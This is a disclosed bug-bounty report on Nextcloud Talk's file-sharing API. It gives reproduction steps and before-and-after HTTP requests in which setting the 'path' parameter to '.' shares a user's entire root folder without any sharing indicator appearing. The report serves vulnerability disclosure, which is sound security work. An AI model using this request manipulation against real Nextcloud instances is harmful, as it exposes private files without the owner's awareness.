# Allows any user to share their "Root" level folder by sharing "."

## Report Details
- **Report ID**: 889795
- **URL**: https://hackerone.com/reports/889795
- **State**: Closed
- **Severity**: none
- **Submitted**: 2020-06-03T04:18:22.837Z
- **Disclosed**: 2020-06-03T12:04:05.385Z

## Reporter
- **Username**: chevonphillip
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nextcloud

## Vulnerability Information
There seems to be a bug in the "File to Share" feature of Nextcloud Talk. This allows any authenticated user/admin to share their "root" level folder by manipulating the ```"path":``` parameter in the JSON body request to the remote API ```/nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares```

Steps to repo:
1. Create a new user account with no permissions/shared files
1. In the admin account enable Nextcloud Talk(speed)
1. Invite the new user to the chat
1. Click on the file symbol in the chat window
1. The file to share dialog window will popup
1. select any folder from the admin account.
1. Capture tat HTTP POST request in burp repeater 
1. Change the ```"path:"/<folder_name>"``` to ```path:"."``` which indicated the "root level of the folder"

You might get a 403 but if you look at the chat window on the user side you will see the admin "root" folder shared to the user.
This also works if you create a group chat and do the same steps.

## Expected Request
```
POST /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares HTTP/1.1
Host: [removed]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
requesttoken: [removed]
Content-Length: 82
Origin: [removed]
Connection: close
Cookie: [removed]; oc_sessionPassphrase=[removed]; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=[removed]; nc_token=[removed]; nc_session_id=[removed]

{"shareType":10,"path":"/Payroll","shareWith":"4uuxs2yg"}
```
## Expected Behavior
Admin or user is only allowed to share folders that are visible within the "root" folder directory.

## Modified Request
```
POST /nextcloud/ocs/v2.php/apps/files_sharing/api/v1/shares HTTP/1.1
Host: [removed]
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:77.0) Gecko/20100101 Firefox/77.0
Accept: application/json, text/plain, */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
requesttoken: [removed]
Content-Length: 82
Origin: [removed]
Connection: close
Cookie: [removed]; oc_sessionPassphrase=[removed]; nc_sameSiteCookielax=true; nc_sameSiteCookiestrict=true; nc_username=[removed]; nc_token=[removed]; nc_session_id=[removed]

{"shareType":10,"path":".","shareWith":"4uuxs2yg"}
```

## Modified Behavior 
The user is able to see all folders and any newly created folders in the admin account which can lead to sensitive information leakage. The reason this is an issue is once you go back home to the admin account there is no shared icon on the admin folders. This misleads the admin to think that there are no folders being shared.

## Impact

An admin can create another user that they trust and that the user can conduct the malicious attack but sharing out the entire root folder without the admin noticing because there are not shared icons on the folders. This can also lead to admin creating sensitive documents/folder in which the user would be able to see everything newly created file and folder.

## Attachments
- bandicam_2020-06-03_00-07-36-061.mp4
